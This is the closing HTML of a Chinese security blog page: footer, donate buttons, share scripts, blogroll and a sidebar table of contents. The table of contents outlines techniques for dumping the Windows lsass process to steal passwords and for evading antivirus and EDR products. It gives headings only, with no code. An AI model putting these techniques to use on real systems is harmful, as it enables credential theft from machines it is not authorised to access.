+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lengjibo.github.io/lassdump/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+
+      
+    </div>
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #555;font-size:14px;">-------------The End-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="冷逸 WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zhifubao.jpg" alt="冷逸 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+               <div>
+                 
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+               </div>
+            
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/bypass360netuser/" rel="next" title="绕过360添加用户">
+                <i class="fa fa-chevron-left"></i> 绕过360添加用户
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg"
+                alt="冷逸" />
+            
+              <p class="site-author-name" itemprop="name">冷逸</p>
+              <p class="site-description motion-element" itemprop="description">做一个温柔的人...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">95</span>
+                    <span class="site-state-item-name">Artikel</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">18</span>
+                    <span class="site-state-item-name">Kategorien</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">112</span>
+                    <span class="site-state-item-name">Tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/../../.deploy_git/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/lengjibo" target="_blank" title="GitHub"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="qqlengyi@163.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+        <div id="music163player">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="https://music.163.com/outchain/player?type=0&id=377079922&auto=1&height=90"></iframe>
+          </div>
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.zfsec.cn/" title="青春's blog" target="_blank">青春's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.addon.pub/" title="Yokeen's blog" target="_blank">Yokeen's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://freeerror.org/" title="之乎者也's blog" target="_blank">之乎者也's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.bugbank.cn/team/FrigidSword" title="漏洞银行" target="_blank">漏洞银行</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.vulbox.com/team/Frigid%20Sword%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F" title="漏洞盒子" target="_blank">漏洞盒子</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://godpang.github.io/" title="Mr.赵" target="_blank">Mr.赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://amliaw4.github.io/" title="amliaW4'S Blog" target="_blank">amliaW4'S Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.se7ensec.cn/" title="se7en's Blog" target="_blank">se7en's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ninjia.gitbook.io/secskill/" title="secskill" target="_blank">secskill</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.bug1024.cn/" title="ibug" target="_blank">ibug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://wwcx.org/" title="Strjziny's Blog" target="_blank">Strjziny's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#lsass进程转存"><span class="nav-number">1.</span> <span class="nav-text">lsass进程转存</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#普通转存："><span class="nav-number">1.1.</span> <span class="nav-text">普通转存：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用shellcode进行转存："><span class="nav-number">1.2.</span> <span class="nav-text">使用shellcode进行转存：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bypass-nod32转存"><span class="nav-number">1.3.</span> <span class="nav-text">bypass  nod32转存</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Sqldumper-免杀抓明文"><span class="nav-number">1.3.1.</span> <span class="nav-text">Sqldumper 免杀抓明文</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SharpDump-C-免杀抓明文"><span class="nav-number">1.3.2.</span> <span class="nav-text">SharpDump　C#免杀抓明文</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bypass-卡巴斯基转存"><span class="nav-number">1.4.</span> <span class="nav-text">bypass　卡巴斯基转存</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#蓝屏dump法："><span class="nav-number">1.4.1.</span> <span class="nav-text">蓝屏dump法：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ssp注入法："><span class="nav-number">1.4.2.</span> <span class="nav-text">ssp注入法：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#结合直接系统调用和sRDI来绕过AV-EDR"><span class="nav-number">1.5.</span> <span class="nav-text">结合直接系统调用和sRDI来绕过AV / EDR</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用comsvcs-dll进行转存"><span class="nav-number">1.6.</span> <span class="nav-text">使用comsvcs.dll进行转存</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bypass-Cilence转存"><span class="nav-number">1.7.</span> <span class="nav-text">bypass Cilence转存</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注入lsass获取密码"><span class="nav-number">1.8.</span> <span class="nav-text">注入lsass获取密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考文章："><span class="nav-number">1.9.</span> <span class="nav-text">参考文章：</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2014 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">冷逸</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.4.0</div>
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="Total Visitors">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="Total Views">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
